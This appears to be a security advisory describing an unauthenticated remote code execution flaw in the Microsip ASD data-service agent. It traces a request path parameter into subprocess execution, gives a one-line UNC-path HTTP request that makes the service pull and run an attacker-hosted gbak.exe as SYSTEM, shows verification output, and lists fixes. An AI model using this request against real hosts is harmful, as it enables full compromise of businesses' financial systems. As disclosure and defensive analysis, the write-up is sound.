# Microsip ASD — Unauthenticated UNC Binary-Planting RCE

## 1. Research Target & Attack Surface

Microsip 2026 Eval (Microsip, Mexico) is an SMB ERP / accounting / business-management desktop suite — the system of record for a small company's finances. The ASD component (**A**gente **S**ervidor de **D**atos — data-service agent) is `AgenteSD.exe`, a PyInstaller bundle (Python 3.11 + FastAPI + uvicorn) running as a Windows service (WinSW `AgenteServidorDatosMicrosip`) under **LocalSystem**, listening on **0.0.0.0:8555** (HTTPS, self-signed). A self-authored FastAPI service running as LocalSystem is exactly the profile worth probing.

Relevant surface (all reachable without credentials):

| Endpoint | Method | Source param | Flows into sink |
|---|---|---|---|
| `/version_firebird` | GET | `path` (Query) | `get_gbak(path)` → `subprocess.run` |
| `/validar-estructura` | POST | `install_path` (JSON) | `get_gbak(install_path)` → subprocess |
| `/respaldar-bd` | POST | `install_path` (JSON) | `get_gbak(install_path)` → subprocess |
| `/restaurar-bd` | POST | `install_path` (JSON) | `get_gbak(install_path)` → subprocess |

## 2. Sink Identification: subprocess with a Fully Controlled Binary Path

The backup runner resolves the Firebird `gbak.exe` path from the request parameter and executes it:

```python
# firebird_tools.get_gbak(install_path) — install_path from request, no validation
def get_gbak(install_path):
    gbak_path = os.path.join(install_path, "gbak.exe")
    if os.path.isfile(gbak_path):
        return gbak_path
    return None

# runner — list-form subprocess, no shell=True, but binary path fully controlled
gbak_path = firebird_tools.get_gbak(path)        # path = request parameter
result = subprocess.run([gbak_path, "-Z"],       # ← SINK: executes attacker-specified binary
                        capture_output=True, text=True)
```

Two observations drove the exploit design:
1. `subprocess.run` is list-form (`[gbak_path, "-Z"]`), no `shell=True` → shell metacharacter injection is excluded (`;`/`|`/`&` not interpreted)
2. But the **binary path `gbak_path` is fully controlled by the request parameter**, and `os.path.join` accepts UNC paths (`\\attacker\share\`) → **binary-planting RCE**: controlling which binary executes is equivalent to RCE

## 3. Source Identification: path / install_path

All four endpoints feed their `path` or `install_path` parameter straight into `get_gbak`. Route registration from the decompiled bytecode:

```python
@app.get("/version_firebird")
def get_version_firebird(path: str = Query(...)):   # ← path, no validation
    return services.get_version_firebird(path)
```

There is no auth gate, no path whitelist, no UNC rejection, no signature check. The parameter flows end-to-end into subprocess.

## 4. End-to-End Data Flow

```
Attacker HTTP request
  GET /version_firebird?path=\\attacker\share\   (no credentials)
    → AgenteSD.get_version_firebird(path)        (FastAPI route, no auth middleware)
    → services.get_version_firebird(path)
    → firebird_tools.get_gbak(path)
      → gbak_path = os.path.join("\\attacker\share\", "gbak.exe")
        = "\\attacker\share\gbak.exe"            (UNC; os.path.isfile resolves via SMB)
    → subprocess.run(["\\attacker\share\gbak.exe", "-Z"])
    → LocalSystem executes the attacker binary    ← RCE
```

## 5. Exploit Construction

### 6.1 Attacker-side preparation

1. Place an arbitrary PE named `gbak.exe` on an attacker-controlled SMB share (`\\attacker\share\`) — e.g. `impacket smbserver.py share ./ -smb2support`, or a WebDAV share (`\\attacker@80\DavWWWRoot\`).
2. Send a single unauthenticated HTTP request:

```http
GET /version_firebird?path=\\attacker\share\ HTTP/1.1
Host: <TARGET_IP>:8555
```

3. ASD pulls and executes `\\attacker\share\gbak.exe` as LocalSystem → RCE.

This is **not** MITM: the attacker directly controls the `path` query parameter (parameter injection); the ASD actively fetches and executes the binary from the attacker-specified location. No traffic interception, no domain/TLS hijack.

## 6. Dynamic Verification

Verified on Microsip 2026 Eval (ASD as LocalSystem):

- Attacker-share stand-in: a local SMB share `\\localhost\rce_share\` (same chain — ASD actively pulls from the path-specified location)
- Marker PE: `gbak.exe` (C# PE) that writes `C:\ProgramData\Microsip\rce_marker.txt` with `WindowsIdentity.GetCurrent().Name` + command-line args + a unique token
- Trigger request: `GET /version_firebird?path=%5C%5Clocalhost%5Crce_share%5C%5C` (`%5C` = URL-encoded `\`)
- HTTP response: **400** `{"detail":"No se pudo parsear la versión del output de GBAK."}` — the expected success signal: `subprocess.run` executed the marker PE, but its stdout was empty (no `Firebird (x.y)` match). A "gbak not found"-type error would have been returned instead if the binary were unreachable.
- Target-side marker:

```
RCE_CONFIRMED
user=NT AUTHORITY\SYSTEM
arg=-Z
token=<unique>
```

`user=NT AUTHORITY\SYSTEM` confirms execution as the Windows highest privilege; `arg=-Z` confirms the `subprocess.run([gbak_path, "-Z"])` call chain; the token confirms the marker PE (not the real gbak.exe) executed.

## 7. Reachability & Impact

- **Network**: ASD binds 0.0.0.0:8555 by design (default config) — remote reachable
- **Auth**: none — any host that can reach the port reaches the sink
- **Binary delivery**: attacker-controlled SMB/WebDAV share; ASD actively pulls it (requires target outbound 445/80, typical for real Windows deployments)

The impact is unauthenticated remote code execution as **LocalSystem** — full compromise of the Microsip host and its accounting/business data, plus a native privilege ceiling (OS maximum).

## 8. Fix Recommendations

1. Add global authentication to the FastAPI app (API key / JWT middleware); reject unauthenticated requests
2. Whitelist `path`/`install_path` to the local Firebird install directory; reject UNC/relative/arbitrary absolute paths
3. Reject UNC in `get_gbak` (`path.startswith("\\\\")` → reject)
4. Verify the gbak.exe digital signature before execution
5. Run ASD under a least-privilege service account, not LocalSystem
6. Bind 127.0.0.1:8555 if the agent is local-only
